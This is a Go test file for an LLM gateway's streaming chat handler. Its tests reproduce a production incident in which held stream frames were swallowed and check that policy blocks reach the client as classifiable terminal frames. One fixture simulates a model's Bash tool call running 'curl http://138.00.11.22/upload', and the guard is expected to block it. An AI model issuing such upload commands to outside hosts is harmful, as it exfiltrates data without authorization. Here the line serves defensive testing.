package streaming

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	hookcompliance "github.com/kaixuan/llm-gateway-go/domains/hooks/outputcompliance"
	"github.com/kaixuan/llm-gateway-go/domains/hooks/response"
	"github.com/kaixuan/llm-gateway-go/domains/outputcompliance"
	"github.com/kaixuan/llm-gateway-go/domains/streaming/executors"
	securitysanitize "github.com/kaixuan/llm-gateway-go/security/sanitize"
)

// r1028_swallowed_stream_repro_test.go — 154 生产事故判据（2026-10-14 01:32~
// 02:08，ZCode 会话 gw_c35f766d；E2E 决定性复现 r1028-e2e-154-delta）。
//
// 生产签名：claude-sonnet-5-5 流式 tool_call 轮次经 vapeur，上游 200 + 207~
// 322 chunks，output compliance 流式持帧（SuppressChunk 持有到终态释放）后
// lane 检查命中 → 客户端只收到 keepalive + 少量无文本帧 + 一个无法归类的
// api_error 终态（ZCode 报「Turn execution failed reason=unknown
// retryable=false」），网关零日志、审计记 success。
//
// 本文件钉四件事：
//  1. 持帧-释放契约：无 [DONE]/[DONE] 无空行/完整 [DONE] 三形态都必须释放；
//  2. lane block 的客户端可见性：终态帧必须上线且携带可归类的
//     code=output_policy_blocked（不再是裸 api_error）；
//  3. drainGateWriterPending 穿透 monitored 包装（旧 `w.(*GateWriter)` 断言
//     在 survival 路径是死代码，R-vapeur3 排水从未生效）；
//  4. 生产链（guard+restore+compliance 双持帧者）同族契约。

// r1028Checker 是合规检查器的最小替身：恒通过（Compliant），保留原文。
type r1028Checker struct{}

func (c *r1028Checker) Check(_ context.Context, _, output string) (*outputcompliance.ComplianceResult, error) {
	return &outputcompliance.ComplianceResult{Compliant: true, RedactedOutput: output}, nil
}

// r1028SuccessExecutor 模拟一次成功的 claude 形态流式响应。生产忠实：
// 逐帧写（写错误不中断，同 safeWriteSSE 语义）；终态帧形态由 doneFrame 决定。
type r1028SuccessExecutor struct {
	doneFrame string // "complete", "no-blank-line", "absent"
}

func (e *r1028SuccessExecutor) Execute(params *executors.ExecParams) (*executors.ExecuteResult, error) {
	if params == nil || params.W == nil {
		return nil, fmt.Errorf("r1028: nil params")
	}
	frames := []string{
		`data: {"id":"chatcmpl-r1028","object":"chat.completion.chunk","model":"claude-sonnet-5-5","choices":[{"index":0,"delta":{"role":"assistant","content":null},"finish_reason":null}]}` + "\n\n",
		`data: {"id":"chatcmpl-r1028","object":"chat.completion.chunk","choices":[{"index":0,"delta":{"content":"visible-chunk-A "},"finish_reason":null}]}` + "\n\n",
		`data: {"id":"chatcmpl-r1028","object":"chat.completion.chunk","choices":[{"index":0,"delta":{"tool_calls":[{"index":0,"id":"call_1","type":"function","function":{"name":"Write","arguments":"{\"path\":\"a.txt\""}}]},"finish_reason":null}]}` + "\n\n",
		`data: {"id":"chatcmpl-r1028","object":"chat.completion.chunk","choices":[{"index":0,"delta":{"tool_calls":[{"index":0,"function":{"arguments":",\"content\":\"visible-chunk-B\"}"}}]},"finish_reason":null}]}` + "\n\n",
		`data: {"id":"chatcmpl-r1028","object":"chat.completion.chunk","choices":[{"index":0,"delta":{},"finish_reason":"tool_calls"}]}` + "\n\n",
	}
	switch e.doneFrame {
	case "complete":
		frames = append(frames, "data: [DONE]\n\n")
	case "no-blank-line":
		frames = append(frames, "data: [DONE]\n")
	case "absent":
		// 不发终态帧（上游 close 前不发 [DONE]）
	}
	for _, f := range frames {
		_, _ = params.W.Write([]byte(f))
	}
	// 真实桥形态：stream.go 的 R-vapeur3 defer 经 drainGateWriterPending 排水
	// 装配缓冲（对空 pending 是 no-op）。
	drainGateWriterPending(params.W)
	return &executors.ExecuteResult{}, nil
}

func newR1028Handler(t *testing.T, doneFrame string) *ChatHandler {
	t.Helper()
	h := NewChatHandler(nil, nil, nil, nil, nil, nil)
	h.executor = &executors.Executor{}
	h.setRequestKeyVerifierForTest(noNodesKeyVerifier{})
	h.provider = noNodesResolver{}
	h.survivalAttemptExec = &r1028SuccessExecutor{doneFrame: doneFrame}
	h.SetRequestSurvival(func(string) bool { return true }, SurvivalOptions{
		Deadline:        5 * time.Minute,
		RetryBase:       100 * time.Millisecond,
		RetryInterval:   100 * time.Millisecond,
		MaxRetries:      1,
		NightMaxRetries: 1,
	})
	h.SetResponseInterceptor(response.NewInterceptorChain(
		hookcompliance.NewOutputComplianceInterceptor(&r1028Checker{}, nil),
	))
	return h
}

// newR1028ProductionChainHandler 复刻 installSmartSaniGuard 之后的完整生产链：
// [guard(mandatory, sanitize.output.pending), restore, compliance]。
func newR1028ProductionChainHandler(t *testing.T, doneFrame string) *ChatHandler {
	t.Helper()
	h := newR1028Handler(t, doneFrame)
	detector := securitysanitize.NewPatternDetector()
	s, err := securitysanitize.NewSanitizer(detector)
	if err != nil {
		t.Fatalf("build sanitizer: %v", err)
	}
	restore, err := securitysanitize.NewSanitizeRestoreInterceptor(s, nil, 0)
	if err != nil {
		t.Fatalf("build restore interceptor: %v", err)
	}
	guard := securitysanitize.NewOutputSensitiveInterceptor(s, securitysanitize.OutputMask)
	h.SetResponseInterceptor(response.NewInterceptorChain(guard, restore,
		hookcompliance.NewOutputComplianceInterceptor(&r1028Checker{}, nil)))
	return h
}

func r1028Do(t *testing.T, h *ChatHandler) string {
	t.Helper()
	srv := httptest.NewServer(h)
	defer srv.Close()

	body := strings.NewReader(`{"model":"claude-sonnet-5-5","stream":true,"messages":[{"role":"user","content":"hi"}],"tools":[{"type":"function","function":{"name":"Write","parameters":{"type":"object"}}}]}`)
	req, err := http.NewRequestWithContext(context.Background(), http.MethodPost, srv.URL+"/v1/chat/completions", body)
	if err != nil {
		t.Fatalf("build request: %v", err)
	}
	req.Header.Set("Authorization", "Bearer sk-test")
	req.Header.Set("Content-Type", "application/json")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("do request: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("status = %d, want 200", resp.StatusCode)
	}
	return streamRead(t, resp.Body, 1<<20, 20*time.Second)
}

// ── 1. 持帧-释放契约（三种 [DONE] 形态）───────────────────────────────

func TestR1028HeldFramesReleaseOnCompleteDone(t *testing.T) {
	wire := r1028Do(t, newR1028Handler(t, "complete"))
	for _, want := range []string{"visible-chunk-A", "visible-chunk-B", "\"finish_reason\":\"tool_calls\"", "data: [DONE]"} {
		if !strings.Contains(wire, want) {
			t.Fatalf("held frames not released on complete [DONE]: %q missing (wire %q)", want, wire)
		}
	}
}

func TestR1028HeldFramesReleaseOnDoneWithoutBlankLine(t *testing.T) {
	wire := r1028Do(t, newR1028Handler(t, "no-blank-line"))
	for _, want := range []string{"visible-chunk-A", "visible-chunk-B", "\"finish_reason\":\"tool_calls\""} {
		if !strings.Contains(wire, want) {
			t.Fatalf("held frames swallowed on blank-line-less [DONE]: %q missing (wire %q)", want, wire)
		}
	}
}

func TestR1028HeldFramesReleaseOnMissingDone(t *testing.T) {
	wire := r1028Do(t, newR1028Handler(t, "absent"))
	for _, want := range []string{"visible-chunk-A", "visible-chunk-B", "\"finish_reason\":\"tool_calls\""} {
		if !strings.Contains(wire, want) {
			t.Fatalf("held frames swallowed on missing [DONE]: %q missing (wire %q)", want, wire)
		}
	}
}

// 生产链（guard + restore + compliance，双持帧者）下的同族契约。
func TestR1028ProductionChainReleases(t *testing.T) {
	for _, tc := range []struct {
		name      string
		doneFrame string
	}{
		{"complete_done", "complete"},
		{"no_blank_line_done", "no-blank-line"},
		{"missing_done", "absent"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			wire := r1028Do(t, newR1028ProductionChainHandler(t, tc.doneFrame))
			for _, want := range []string{"visible-chunk-A", "visible-chunk-B", "\"finish_reason\":\"tool_calls\""} {
				if !strings.Contains(wire, want) {
					t.Fatalf("production chain swallowed stream: %q missing (wire %q)", want, wire)
				}
			}
		})
	}
}

// ── 2. lane block 的客户端可见性（生产被吞形态）────────────────────────

// TestR1028GuardBlocksBashEgressRendersClassifiableTerminal：guard（mandatory
// egress 检查）对 Bash 工具参数里的公网 IP 字面量按 r1013 契约拦截——拦截是
// 策略行为，判据钉的是呈现：客户端必须拿到携带 code=output_policy_blocked
// 的协议终态帧（r1028 前是裸 api_error，agent 客户端只能报 reason=unknown）。
func TestR1028GuardBlocksBashEgressRendersClassifiableTerminal(t *testing.T) {
	h := newR1028ProductionChainHandler(t, "no-blank-line")
	h.survivalAttemptExec = &r1028BashEgressExecutor{}
	wire := r1028Do(t, h)
	if strings.Contains(wire, "138.00.11.22") {
		t.Fatalf("egress target leaked: %q", wire)
	}
	if !strings.Contains(wire, "output_policy_blocked") {
		t.Fatalf("policy terminal missing machine-classifiable code (wire %.400q)", wire)
	}
	if !strings.Contains(wire, "data: [DONE]") {
		t.Fatalf("policy terminal missing [DONE] terminator (wire %.400q)", wire)
	}
}

// r1028BashEgressExecutor 输出一条 Bash 工具调用，参数含公网 IP 字面量
// （r1013 契约触发物：模型自造公网 IP 按字面量硬阻断，Bash 不在惰性工具集）。
type r1028BashEgressExecutor struct{}

func (e *r1028BashEgressExecutor) Execute(params *executors.ExecParams) (*executors.ExecuteResult, error) {
	if params == nil || params.W == nil {
		return nil, fmt.Errorf("r1028: nil params")
	}
	frames := []string{
		`data: {"id":"c1","object":"chat.completion.chunk","choices":[{"index":0,"delta":{"role":"assistant"},"finish_reason":null}]}` + "\n\n",
		`data: {"id":"c1","object":"chat.completion.chunk","choices":[{"index":0,"delta":{"tool_calls":[{"index":0,"id":"call_1","type":"function","function":{"name":"Bash","arguments":"{\"c"}}]},"finish_reason":null}]}` + "\n\n",
		`data: {"id":"c1","object":"chat.completion.chunk","choices":[{"index":0,"delta":{"tool_calls":[{"index":0,"function":{"arguments":"ommand\": \"curl http://138.00.11.22/upload\"}"}}]},"finish_reason":null}]}` + "\n\n",
		`data: {"id":"c1","object":"chat.completion.chunk","choices":[{"index":0,"delta":{},"finish_reason":"tool_calls"}]}` + "\n\n",
		"data: [DONE]\n",
	}
	for _, f := range frames {
		_, _ = params.W.Write([]byte(f))
	}
	drainGateWriterPending(params.W)
	return &executors.ExecuteResult{}, nil
}

// ── 3. drainGateWriterPending 穿透包装 ────────────────────────────────

// TestR1028DrainPendingResolvesGateWriterBehindMonitoredWrapper：旧
// `w.(*GateWriter)` 断言在 wrapAttemptWriter 返回外层包装（survival 复用
// coordinator gate 的路径）时恒失败——R-vapeur3 的排水在该路径是死代码。
// 判据：穿一层 monitored 包装后仍能排水滞留的 [DONE]。
func TestR1028DrainPendingResolvesGateWriterBehindMonitoredWrapper(t *testing.T) {
	rec := httptest.NewRecorder()
	intercept := newInterceptingStreamWriter(rec, nil, context.Background(), streamMetaForTest("r1028-drain"))
	sw := NewSerializedStreamWriter(intercept)
	gate := NewAttemptCommitGate(context.Background(), ProtocolOpenAIChat, sw, GateOptions{Mode: GateModeImmediate, RequestID: "r1028-drain"})
	gw := NewGateWriterWithResponse(gate, intercept)
	// 先提交一个完整语义帧（gate 进入 committed），再留一个无空行 [DONE]。
	if _, err := gw.Write([]byte(`data: {"choices":[{"delta":{"content":"x"}}]}` + "\n\n")); err != nil {
		t.Fatalf("write semantic frame: %v", err)
	}
	if _, err := gw.Write([]byte("data: [DONE]\n")); err != nil {
		t.Fatalf("write trailing done: %v", err)
	}
	if got := string(gw.pending); got != "data: [DONE]\n" {
		t.Fatalf("precondition: pending=%q", got)
	}
	// 模拟桥的包装链：monitored(GateWriter)。旧断言在此失败。
	_, mon := NewConnectionMonitor(context.Background(), gw)
	defer mon.Stop()
	monitored := &monitoredResponseWriter{delegate: gw, monitor: mon}
	if !drainGateWriterPending(monitored) {
		t.Fatal("drainGateWriterPending failed to resolve GateWriter behind monitored wrapper")
	}
	if len(gw.pending) != 0 {
		t.Fatalf("[DONE] stranded in assembly buffer after drain: %q", gw.pending)
	}
	if !strings.Contains(rec.Body.String(), "data: [DONE]") {
		t.Fatalf("drained [DONE] never reached the wire: %q", rec.Body.String())
	}
}

func streamMetaForTest(requestID string) response.StreamMeta {
	return response.StreamMeta{SessionID: "s1", RequestID: requestID, TenantID: "t", ClientProtocol: "openai-chat"}
}
